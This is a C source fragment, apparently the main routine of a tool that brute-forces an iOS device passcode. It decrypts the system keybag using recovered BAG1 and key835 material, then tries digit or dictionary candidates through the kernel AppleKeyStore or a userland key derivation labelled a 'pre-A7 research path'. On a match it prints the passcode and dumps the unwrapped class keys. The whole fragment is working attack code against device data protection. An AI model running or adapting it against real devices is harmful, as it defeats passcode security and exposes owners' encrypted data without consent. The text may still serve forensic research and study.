    printf("[+] %s: _MKBPAYLOAD %zu bytes\n", kb_path, payload_len);

    BAG1Locker bag1;
    if (get_bag1(key89b, key835, payload, payload_len, &bag1)) {
        fprintf(stderr, "[-] failed to recover BAG1 key material\n");
        return 4;
    }
    hex("[+] bag1.iv", bag1.iv, 16);
    hex("[+] bag1.key", bag1.key, 32);

    CFDictionaryRef inner = load_keybag_dict(payload, payload_len, &bag1);
    free(payload);
    if (!inner) return 5;
    CFDataRef kbdata = CFDictionaryGetValue(inner, CFSTR("KeyBagKeys"));
    if (!kbdata) {
        fprintf(stderr, "[-] KeyBagKeys missing\n");
        return 5;
    }
    printf("[+] decrypted keybag payload: %ld bytes\n", (long)CFDataGetLength(kbdata));

    KeyBag *kb = parse_binary_keybag(kbdata);
    if (!kb || kb->numKeys == 0) {
        fprintf(stderr, "[-] keybag parse failed\n");
        return 5;
    }
    printf("[+] keybag version=%u type=0x%08x iter=%u keys=%u\n",
           kb->version, kb->type, kb->iter, kb->numKeys);
    hex("[+] salt", kb->salt, 20);
    int wrap2 = 0;
    for (uint32_t i = 0; i < kb->numKeys; i++)
        if (kb->keys[i].wrap & 2) wrap2++;
    if (!wrap2) {
        fprintf(stderr, "[-] no passcode-wrapped keys: no passcode set?\n");
        return 5;
    }
    printf("[+] %d passcode-wrapped (wrap&2) keys -> verifiable\n", wrap2);

    // candidate source: -K single, -n digits, or -k dictionary
    CandSrc cand;
    memset(&cand, 0, sizeof(cand));
    if (digits > 0) {
        cand.digits = digits;
        cand.total = 1;
        for (int i = 0; i < digits; i++) cand.total *= 10;
    } else if (dict_path) {
        cand.dict = fopen(dict_path, "r");
        if (!cand.dict) {
            fprintf(stderr, "[-] cannot open dictionary %s\n", dict_path);
            return 2;
        }
    }

    if (!userland) {
        // kernel AppleKeyStore verification (default; SEP executes underneath)
        if (single) {
            g_ks_conn = open_service("AppleKeyStore");
            if (!g_ks_conn) return 7;
            printf("[.] AppleKeyStore init rc=0x%08x\n", ks_init());
            uint64_t id = 0;
            kern_return_t kr = ks_keybag_create(CFDataGetBytePtr(kbdata),
                                                CFDataGetLength(kbdata), &id);
            printf("[.] KeyBagCreateWithData rc=0x%08x id=0x%llx\n", kr,
                   (unsigned long long)id);
            if (kr != KERN_SUCCESS) return 7;
            printf("[.] KeyBagSetSystem rc=0x%08x\n", ks_keybag_set_system(id));
            double t0 = now_ms();
            kr = ks_unlock(single, strlen(single));
            printf("[K] \"%s\" -> rc=0x%08x %s (%.1f ms)\n", single, kr,
                   kr == KERN_SUCCESS ? "*** FOUND ***" : "rejected",
                   now_ms() - t0);
            return kr == KERN_SUCCESS ? 0 : 1;
        }
        char found[256] = {0};
        int r = kext_brute(&cand, kbdata, reset_every, found, sizeof(found));
        if (cand.dict) fclose(cand.dict);
        if (r == 0) {
            printf("=== PASSCODE FOUND: %s ===\n", found);
            return 0;
        }
        printf("=== passcode not found (kext mode, rc=%d) ===\n", r);
        return 1;
    }

    // userland tangle verification (pre-A7 research path)
    char line[256];
    char found_passcode[256] = {0};
    uint8_t passcode_key[32];
    KeyBag scratch;
    int index = 0, found = 0;
    double t_all = now_ms();

    while (single ? (index == 0 ? strlcpy(line, single, sizeof(line)), 1 : 0)
                  : cand_next(&cand, line, sizeof(line))) {
        index++;
        double t0 = now_ms();
        if (derive_passcode_key(kb, passcode_key, line, strlen(line)) != 0) {
            fprintf(stderr, "[-] derivation failed on \"%s\"\n", line);
            break;
        }
        memcpy(&scratch, kb, sizeof(scratch));
        int ok = verify_passcode(&scratch, passcode_key);
        printf("[%d] \"%s\" -> %s (%.1f ms)\n", index, line,
               ok ? "*** FOUND ***" : "rejected", now_ms() - t0);
        if (ok) {
            strlcpy(found_passcode, line, sizeof(found_passcode));
            found = 1;
            break;
        }
    }
    if (cand.dict) fclose(cand.dict);

    double total = now_ms() - t_all;
    printf("[i] %d candidates in %.1f ms\n", index, total);    if (found) {
        printf("=== PASSCODE FOUND: %s ===\n", found_passcode);
        hex("[+] passcodeKey", passcode_key, 32);
        printf("class keys (wrap&2 unwrapped; wrap&1 decrypted with key835):\n");
        for (uint32_t i = 0; i < scratch.numKeys; i++) {
            ClassKey *k = &scratch.keys[i];
            if (k->wrap & 1) {
                uint8_t buf[40] __attribute__((aligned(64)));
                memset(buf, 0, sizeof(buf));
                memcpy(buf, k->wpky, 32);
                if (aes_run(buf, buf, 32, kAESCustomMask, key835,
                            kAESDecrypt, 0) == KERN_SUCCESS) {
                    memcpy(k->wpky, buf, 32);
                    k->wrap &= ~1;
                } else {
                    printf("[!] class=%u device-unwrap failed\n", k->clas);
                }
            }
            printf("class=%2u wrap=%u key=", k->clas, k->wrap);
            for (int j = 0; j < 32; j++) printf("%02x", k->wpky[j]);
            putchar('\n');
        }
        return 0;
    }
    printf("=== passcode not in dictionary ===\n");
    return 1;
}
